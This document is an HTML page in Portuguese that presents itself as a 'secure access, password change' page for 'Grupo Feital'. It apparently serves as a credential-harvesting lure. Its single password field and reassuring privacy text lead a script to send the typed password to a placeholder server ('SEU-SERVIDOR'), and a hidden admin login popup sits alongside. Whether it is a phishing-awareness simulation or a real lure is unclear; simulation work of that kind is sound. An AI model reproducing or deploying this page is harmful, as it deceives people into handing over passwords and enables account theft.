<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Acesso Seguro – Alteração de Senha</title>
  <link rel="icon" href="Icon.png" >
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="StyleSenha.css" rel="stylesheet">

</head>
<body>
  <nav>
    <button class="btn_nav"  onclick="abrirPopup()">Admin</button>
  </nav>


  <h2>Acesso Seguro – Alteração de Senha</h2>
  <p>Sua privacidade é importante para nós. Por isso, sua senha não será visível.</p>

  <form id="senhaForm">
    <div class="input-icon">
      <img src="key.png" alt="ícone de chave">
      <input type="password" id="senha" placeholder="Digite a senha" required />
    </div>
    <br />
    <button type="submit">Enviar</button>
  </form>

  <img src="FeitalLogo.png" alt="Grupo Feital" />

  <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
    <h3>Login de Admin</h3>
      <form action="server.js" method="POST">
        <input type="text" name="usuario" placeholder="Usuário">
        <input type="password" name="senha" placeholder="Senha">
        <button type="submit">Entrar</button>
      </form>
  </div>

  <script>
    // Abre o popup
    function abrirPopup() {
      document.getElementById('popup').style.display = 'block';
      document.getElementById('overlay').style.display = 'block';
    }

    // Fecha o popup
    function fecharPopup() {
      document.getElementById('popup').style.display = 'none';
      document.getElementById('overlay').style.display = 'none';
    }

    // Fecha o popup clicando fora dele
    document.getElementById('overlay').addEventListener('click', fecharPopup);

    // Script de envio de senha normal
    document.getElementById("senhaForm").addEventListener("submit", async function (e) {
      e.preventDefault();
      const senha = document.getElementById("senha").value;

      const response = await fetch("https://SEU-SERVIDOR/api/senha", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ senha })
      });

      if (response.ok) {
        alert("Senha enviada com sucesso!");
        document.getElementById("senha").value = "";
      } else {
        alert("Erro ao enviar senha.");
      }
    });
  </script>
</body>
</html>
